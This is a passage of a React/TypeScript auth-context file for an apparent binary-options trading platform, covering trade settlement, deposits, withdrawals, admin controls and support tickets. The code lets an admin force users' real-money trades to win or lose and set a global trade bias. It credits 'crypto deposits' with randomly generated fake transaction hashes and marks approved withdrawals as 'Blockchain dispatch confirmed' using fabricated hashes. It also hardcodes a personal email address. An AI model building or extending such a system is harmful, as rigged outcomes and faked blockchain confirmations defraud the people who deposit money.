    } else if (effectiveRule === 'FORCE_DOWN_WINS') {
      isWin = true;
      finalClosePrice = trade.direction === 'LOW' ? trade.entryPrice - delta : trade.entryPrice + delta;
    } else if (effectiveRule === 'FORCE_WIN' || effectiveRule === 'WIN') {
      isWin = true;
      finalClosePrice =
        trade.direction === 'HIGH' ? trade.entryPrice + delta : trade.entryPrice - delta;
    } else if (effectiveRule === 'FORCE_LOSS' || effectiveRule === 'LOSS') {
      isWin = false;
      finalClosePrice =
        trade.direction === 'HIGH' ? trade.entryPrice - delta : trade.entryPrice + delta;
    } else {
      // AUTO (Real Market Data)
      isWin = trade.direction === 'HIGH' ? closePrice > trade.entryPrice : closePrice < trade.entryPrice;
      finalClosePrice = closePrice;
    }

    const profitReturn = isWin ? trade.amount + trade.amount * trade.payoutRate : 0;
    const netPnl = isWin ? trade.amount * trade.payoutRate : -trade.amount;
    const status: TradeStatus = isWin ? 'WON' : 'LOST';

    const currentMode = trade.mode;
    const balanceKey = currentMode === 'demo' ? 'demoBalance' : 'realBalance';

    const updatedTrade: TradeOrder = {
      ...trade,
      closePrice: finalClosePrice,
      status,
      pnl: netPnl,
    };

    // Update in-memory state immediately so UI and Trade History match instantly
    setActiveTrades((prev) => prev.filter((t) => t.id !== tradeId));
    setCompletedTrades((prev) => [updatedTrade, ...prev.filter((t) => t.id !== tradeId)]);
    if (isWin && profitReturn > 0) {
      setUserProfile((prev) => {
        if (!prev) return prev;
        const prevBal = currentMode === 'demo' ? prev.demoBalance : prev.realBalance;
        return { ...prev, [balanceKey]: prevBal + profitReturn };
      });
    }

    try {
      const tradeRef = doc(db, 'users', currentUser.uid, 'trades', tradeId);
      await updateDoc(tradeRef, {
        closePrice: finalClosePrice,
        status,
        pnl: netPnl,
        updatedAt: new Date().toISOString(),
      });

      if (isWin && profitReturn > 0) {
        const userRef = doc(db, 'users', currentUser.uid);
        const currentBalance =
          currentMode === 'demo' ? (userProfile?.demoBalance || 0) : (userProfile?.realBalance || 0);
        await updateDoc(userRef, {
          [balanceKey]: currentBalance + profitReturn,
          updatedAt: new Date().toISOString(),
        });
      }

      // Record transaction
      const txId = 'tx_' + Date.now();
      const txRef = doc(db, 'users', currentUser.uid, 'transactions', txId);
      const newTx: WalletTransaction = {
        id: txId,
        userId: currentUser.uid,
        type: isWin ? 'TRADE_PROFIT' : 'TRADE_LOSS',
        amount: Math.abs(netPnl),
        currency: 'USD',
        status: 'COMPLETED',
        method: `${trade.direction} Option: ${trade.symbol}`,
        timestamp: new Date().toISOString(),
        notes: `${status} ${trade.symbol} (${trade.direction}) Entry: $${trade.entryPrice.toFixed(2)}, Exit: $${finalClosePrice.toFixed(2)}`,
      };
      await setDoc(txRef, newTx);
    } catch (_) {
      // In-memory state already updated
    }

    const orderNumber =
      trade.mode === 'demo'
        ? `Odemo_${(trade.id || '').replace(/[^0-9]/g, '').slice(-12) || Math.floor(100000000000 + Math.random() * 900000000000)}`
        : `O_${(trade.id || '').replace(/[^0-9]/g, '').slice(-12) || Math.floor(100000000000 + Math.random() * 900000000000)}`;

    return {
      trade: updatedTrade,
      isWin,
      status,
      entryPrice: trade.entryPrice,
      closePrice: finalClosePrice,
      amount: trade.amount,
      pnl: netPnl,
      profitReturn,
      expectedReturn: isWin ? netPnl : -trade.amount,
      fee: 0,
      orderNumber,
      symbol: trade.symbol,
      direction: trade.direction,
      mode: trade.mode,
    };
  };

  // Submit simulated crypto deposit
  const submitDeposit = async (amount: number, method: string) => {
    if (!currentUser || !userProfile) throw new Error('Not signed in');

    const txId = 'tx_dep_' + Date.now();
    const newTx: WalletTransaction = {
      id: txId,
      userId: currentUser.uid,
      type: 'DEPOSIT',
      amount,
      currency: 'USD',
      status: 'COMPLETED',
      method,
      timestamp: new Date().toISOString(),
      notes: `Cryptocurrency deposit via ${method}`,
      txHash: '0x' + Array.from({ length: 32 }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
    };

    const newRealBalance = (userProfile.realBalance || 0) + amount;

    try {
      const userRef = doc(db, 'users', currentUser.uid);
      await updateDoc(userRef, {
        realBalance: newRealBalance,
        updatedAt: new Date().toISOString(),
      });
      const txRef = doc(db, 'users', currentUser.uid, 'transactions', txId);
      await setDoc(txRef, newTx);
    } catch {
      setUserProfile((prev) => (prev ? { ...prev, realBalance: newRealBalance } : prev));
      setTransactions((prev) => [newTx, ...prev]);
    }
  };

  // Submit withdrawal request
  const submitWithdrawal = async (amount: number, method: string, destination: string) => {
    if (!currentUser || !userProfile) throw new Error('Not signed in');

    if (userProfile.realBalance < amount) {
      throw new Error(`Insufficient real balance ($${userProfile.realBalance.toFixed(2)} available)`);
    }

    const txId = 'tx_wth_' + Date.now();
    const newTx: WalletTransaction = {
      id: txId,
      userId: currentUser.uid,
      type: 'WITHDRAWAL',
      amount,
      currency: 'USD',
      status: 'PENDING',
      method: `${method} to ${destination}`,
      timestamp: new Date().toISOString(),
      notes: `Withdrawal request to ${destination}. Placed in compliance queue for Admin Authorization.`,
    };

    const newRealBalance = userProfile.realBalance - amount;

    try {
      const userRef = doc(db, 'users', currentUser.uid);
      await updateDoc(userRef, {
        realBalance: newRealBalance,
        updatedAt: new Date().toISOString(),
      });
      const txRef = doc(db, 'users', currentUser.uid, 'transactions', txId);
      await setDoc(txRef, newTx);
      return { success: true, message: 'Withdrawal submitted and placed in admin compliance queue.' };
    } catch {
      setUserProfile((prev) => (prev ? { ...prev, realBalance: newRealBalance } : prev));
      setTransactions((prev) => [newTx, ...prev]);
      return { success: true, message: 'Withdrawal submitted and placed in admin compliance queue.' };
    }
  };

  // -------------------------------------------------------------
  // ADMIN CONTROL METHODS
  // -------------------------------------------------------------

  // Admin: Update Global System Settings (direction bias, risk limits, market disable)
  const updateSystemSettings = async (settings: Partial<SystemSetting>) => {
    const updated = { ...systemSettings, ...settings, updatedAt: new Date().toISOString() };
    setSystemSettings(updated);

    try {
      const sRef = doc(db, 'system_settings', 'global');
      await setDoc(sRef, updated);

      // Audit Log
      const aId = 'log_' + Date.now();
      const aLog: AuditLog = {
        id: aId,
        adminEmail: currentUser?.email || 'admin@trxtrade.com',
        action: 'UPDATE_SYSTEM_SETTINGS',
        reason: `Updated system settings: Bias=${updated.globalTradeBias}`,
        timestamp: new Date().toISOString(),
      };
      await setDoc(doc(db, 'audit_logs', aId), aLog);
      setAuditLogs((prev) => [aLog, ...prev]);
    } catch {
      // optimistic update
    }
  };

  // Admin: Add or Debit money directly from any user account with audit record
  const adminAddMoneyToUser = async (
    targetUserId: string,
    amount: number,
    mode: 'real' | 'demo',
    reason: string
  ) => {
    const fieldKey = mode === 'real' ? 'realBalance' : 'demoBalance';
    const targetUser = allUsers.find((u) => u.uid === targetUserId) || userProfile;
    const currentVal = (targetUser as any)?.[fieldKey] || 0;
    const newVal = Math.max(0, currentVal + amount);

    const txId = 'tx_admin_' + Date.now();
    const newTx: WalletTransaction = {
      id: txId,
      userId: targetUserId,
      type: 'ADMIN_ADJUSTMENT',
      amount: Math.abs(amount),
      currency: 'USD',
      status: 'COMPLETED',
      method: amount >= 0 ? `Admin Credit (${mode.toUpperCase()})` : `Admin Debit (${mode.toUpperCase()})`,
      timestamp: new Date().toISOString(),
      notes: reason || 'Authorized treasury adjustment by platform administrator',
      adminApprovedBy: currentUser?.email || 'System Admin',
    };

    const aId = 'log_' + Date.now();
    const aLog: AuditLog = {
      id: aId,
      adminEmail: currentUser?.email || 'admin@trxtrade.com',
      action: amount >= 0 ? 'FUND_CREDIT' : 'FUND_DEBIT',
      targetUserId,
      targetUserEmail: targetUser?.email,
      amount,
      reason,
      timestamp: new Date().toISOString(),
    };

    try {
      const uRef = doc(db, 'users', targetUserId);
      await updateDoc(uRef, { [fieldKey]: newVal, updatedAt: new Date().toISOString() });
      await setDoc(doc(db, 'users', targetUserId, 'transactions', txId), newTx);
      await setDoc(doc(db, 'audit_logs', aId), aLog);
    } catch {
      // local update
    }

    if (currentUser?.uid === targetUserId && userProfile) {
      setUserProfile((prev) => (prev ? { ...prev, [fieldKey]: newVal } : prev));
    }
    setAllUsers((prev) => prev.map((u) => (u.uid === targetUserId ? { ...u, [fieldKey]: newVal } : u)));
    setAllTransactions((prev) => [newTx, ...prev]);
    setAuditLogs((prev) => [aLog, ...prev]);
  };

  // Admin: Give/Process Withdrawal (Approve or Reject)
  const adminProcessWithdrawal = async (
    txId: string,
    targetUserId: string,
    action: 'APPROVE' | 'REJECT',
    txHash?: string,
    note?: string
  ) => {
    const status: TransactionStatus = action === 'APPROVE' ? 'COMPLETED' : 'REJECTED';
    const targetTx = allTransactions.find((t) => t.id === txId) || transactions.find((t) => t.id === txId);
    const amount = targetTx?.amount || 0;

    const aId = 'log_' + Date.now();
    const aLog: AuditLog = {
      id: aId,
      adminEmail: currentUser?.email || 'admin@trxtrade.com',
      action: action === 'APPROVE' ? 'APPROVE_WITHDRAWAL' : 'REJECT_WITHDRAWAL',
      targetUserId,
      amount,
      reason: note || (action === 'APPROVE' ? 'Withdrawal dispatched to blockchain rail' : 'Compliance rejection and refund'),
      timestamp: new Date().toISOString(),
    };

    try {
      const txRef = doc(db, 'users', targetUserId, 'transactions', txId);
      await updateDoc(txRef, {
        status,
        txHash: txHash || '0x' + Math.random().toString(16).substring(2, 14),
        notes: note || (action === 'APPROVE' ? 'Approved by Admin. Blockchain dispatch confirmed.' : 'Rejected by Admin. Funds restored.'),
        adminApprovedBy: currentUser?.email || 'Admin',
      });

      // If rejected, refund the user's real balance
      if (action === 'REJECT') {
        const targetUser = allUsers.find((u) => u.uid === targetUserId) || userProfile;
        const restoredBal = (targetUser?.realBalance || 0) + amount;
        const uRef = doc(db, 'users', targetUserId);
        await updateDoc(uRef, { realBalance: restoredBal, updatedAt: new Date().toISOString() });

        if (currentUser?.uid === targetUserId) {
          setUserProfile((prev) => (prev ? { ...prev, realBalance: restoredBal } : prev));
        }
      }

      await setDoc(doc(db, 'audit_logs', aId), aLog);
    } catch {
      // optimistic
    }

    setAllTransactions((prev) =>
      prev.map((t) => (t.id === txId ? { ...t, status, notes: note || t.notes } : t))
    );
    setTransactions((prev) =>
      prev.map((t) => (t.id === txId ? { ...t, status, notes: note || t.notes } : t))
    );
    setAuditLogs((prev) => [aLog, ...prev]);
  };

  // Admin: Update User KYC Status
  const adminUpdateUserKyc = async (targetUserId: string, status: 'verified' | 'pending' | 'unverified') => {
    try {
      const uRef = doc(db, 'users', targetUserId);
      await updateDoc(uRef, { kycStatus: status, updatedAt: new Date().toISOString() });
    } catch {
      // local
    }
    setAllUsers((prev) => prev.map((u) => (u.uid === targetUserId ? { ...u, kycStatus: status } : u)));
    if (currentUser?.uid === targetUserId) {
      setUserProfile((prev) => (prev ? { ...prev, kycStatus: status } : prev));
    }
  };

  // Admin: Suspend or Reactivate User
  const adminToggleUserSuspension = async (targetUserId: string, isSuspended: boolean) => {
    try {
      const uRef = doc(db, 'users', targetUserId);
      await updateDoc(uRef, { isSuspended, updatedAt: new Date().toISOString() });
    } catch {
      // local
    }
    setAllUsers((prev) => prev.map((u) => (u.uid === targetUserId ? { ...u, isSuspended } : u)));
    if (currentUser?.uid === targetUserId) {
      setUserProfile((prev) => (prev ? { ...prev, isSuspended } : prev));
    }
  };

  // Admin: Force Trade Outcome (Admin controls UP/DOWN winning or losing)
  const adminForceTradeOutcome = async (
    tradeId: string,
    targetUserId: string,
    outcome: 'WIN' | 'LOSS',
    overrideClosePrice?: number
  ) => {
    try {
      const tRef = doc(db, 'users', targetUserId, 'trades', tradeId);
      await updateDoc(tRef, {
        forcedOutcome: outcome,
        closePrice: overrideClosePrice || null,
        updatedAt: new Date().toISOString(),
      });
    } catch {
      // local
    }

    setAllTrades((prev) =>
      prev.map((t) => (t.id === tradeId ? { ...t, forcedOutcome: outcome } : t))
    );
    setActiveTrades((prev) =>
      prev.map((t) => (t.id === tradeId ? { ...t, forcedOutcome: outcome } : t))
    );
  };

  // Customer Service: Send message to customer service
  const sendCustomerMessage = async (params: {
    subject: string;
    message: string;
    imageUrl?: string;
    name?: string;
    email?: string;
  }) => {
    const userId = currentUser?.uid || 'guest_' + Math.random().toString(36).substring(2, 9);
    const userEmail = currentUser?.email || params.email || 'guest@trxtrade.com';
    const userName = currentUser?.displayName || params.name || 'Trader';
    const ticketId = userTicket?.id || `ticket_${userId.replace(/[^a-zA-Z0-9]/g, '')}`;

    const textContent = params.message || (params.imageUrl ? '📷 [Photo Attached]' : '');

    const newMsg: SupportMessage = {
      id: `msg_${Date.now()}`,
      ticketId,
      senderId: userId,
      senderName: userName,
      senderEmail: userEmail,
      senderRole: 'user',
      message: textContent,
      imageUrl: params.imageUrl,
      timestamp: new Date().toISOString(),
    };

    const existingTicket = supportTickets.find((t) => t.id === ticketId);
    const updatedMessages = existingTicket
      ? [...existingTicket.messages, newMsg]
      : userTicket
      ? [...userTicket.messages, newMsg]
      : [newMsg];

    const updatedTicket: SupportTicket = {
      id: ticketId,
      userId,
      userEmail,
      userName,
      subject: params.subject,
      status: 'OPEN',
      priority: 'HIGH',
      lastMessage: textContent,
      lastMessageSender: 'user',
      unreadByAdmin: true,
      unreadByUser: false,
      messages: updatedMessages,
      createdAt: existingTicket?.createdAt || new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    setUserTicket(updatedTicket);
    setSupportTickets((prev) => {
      const idx = prev.findIndex((t) => t.id === ticketId);
      const next = idx >= 0 ? prev.map((t) => (t.id === ticketId ? updatedTicket : t)) : [updatedTicket, ...prev];
      try {
        localStorage.setItem('trxtrade_support_tickets', JSON.stringify(next));
      } catch {}
      return next;
    });

    try {
      const tRef = doc(db, 'support_tickets', ticketId);
      await setDoc(tRef, updatedTicket, { merge: true });
    } catch (e) {
      console.warn('Firestore support ticket write notice:', e);
    }
  };

  // Admin: Reply to customer support ticket
  const adminReplySupportTicket = async (
    ticketId: string,
    replyMessage: string,
    newStatus: 'OPEN' | 'IN_PROGRESS' | 'RESOLVED' = 'IN_PROGRESS',
    imageUrl?: string
  ) => {
    const textContent = replyMessage || (imageUrl ? '📷 [Photo Attached]' : '');

    const adminMsg: SupportMessage = {
      id: `msg_${Date.now()}`,
      ticketId,
      senderId: currentUser?.uid || 'admin',
      senderName: 'TRX Chief Admin',
      senderEmail: 'ayesha1357ji@gmail.com',
      senderRole: 'admin',
      message: textContent,
      imageUrl,
      timestamp: new Date().toISOString(),
    };

    setSupportTickets((prev) => {
      const next = prev.map((t) => {
        if (t.id === ticketId) {
          return {
            ...t,
            status: newStatus,
            lastMessage: textContent,
            lastMessageSender: 'admin' as const,
            unreadByAdmin: false,
            unreadByUser: true,
            updatedAt: new Date().toISOString(),
            messages: [...t.messages, adminMsg],
          };
        }
        return t;
      });
      try {
        localStorage.setItem('trxtrade_support_tickets', JSON.stringify(next));
      } catch {}
      return next;
    });

    setUserTicket((prev) => {
      if (prev && prev.id === ticketId) {
        return {
          ...prev,
          status: newStatus,
          lastMessage: textContent,
          lastMessageSender: 'admin' as const,
          unreadByAdmin: false,
          unreadByUser: true,
          updatedAt: new Date().toISOString(),
          messages: [...prev.messages, adminMsg],
        };
      }
      return prev;
    });

    try {
      const tRef = doc(db, 'support_tickets', ticketId);
      const snap = await getDoc(tRef);
      if (snap.exists()) {
        const data = snap.data() as SupportTicket;
        await updateDoc(tRef, {
          status: newStatus,
          lastMessage: textContent,
          lastMessageSender: 'admin',
          unreadByAdmin: false,
          unreadByUser: true,
          updatedAt: new Date().toISOString(),
          messages: [...(data.messages || []), adminMsg],
        });
      }
    } catch (e) {
      console.warn('Admin ticket reply sync notice:', e);
    }
  };

  // Admin: Update ticket status
  const adminUpdateTicketStatus = async (
    ticketId: string,
    status: 'OPEN' | 'IN_PROGRESS' | 'RESOLVED'
  ) => {
    setSupportTickets((prev) => {
      const next = prev.map((t) => (t.id === ticketId ? { ...t, status, updatedAt: new Date().toISOString() } : t));
      try {
        localStorage.setItem('trxtrade_support_tickets', JSON.stringify(next));
      } catch {}
      return next;
    });
    try {
      const tRef = doc(db, 'support_tickets', ticketId);
      await updateDoc(tRef, { status, updatedAt: new Date().toISOString() });
    } catch {}
  };

  return (
    <AuthContext.Provider
      value={{
        currentUser,
        userProfile,
        loading,
        tradingMode: userProfile?.tradingMode || 'demo',
        activeTrades,
        completedTrades,
        transactions,
        isAdmin,
        isMasterAdminMode,
        systemSettings,
        allUsers,
        allTransactions,
        allTrades,
        auditLogs,
        supportTickets,
        userTicket,
        toggleMasterAdmin,
        unlockAdminWithPin,
        lockAdmin,
        signInWithGoogle,
        loginWithEmail,
        signUpWithEmail,
        resetPassword,
        loginAsGuestDemo,
        logout,
        switchTradingMode,
        resetDemoBalance,
        toggleFavorite,
        placeTrade,
        settleTrade,
        submitDeposit,
        submitWithdrawal,
        sendCustomerMessage,
        adminReplySupportTicket,
        adminUpdateTicketStatus,
        updateSystemSettings,
        adminAddMoneyToUser,
        adminProcessWithdrawal,
        adminUpdateUserKyc,
        adminToggleUserSuspension,
        adminForceTradeOutcome,
        refreshAdminData,
      }}
    >
      {children}
    </AuthContext.Provider>
  );

};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
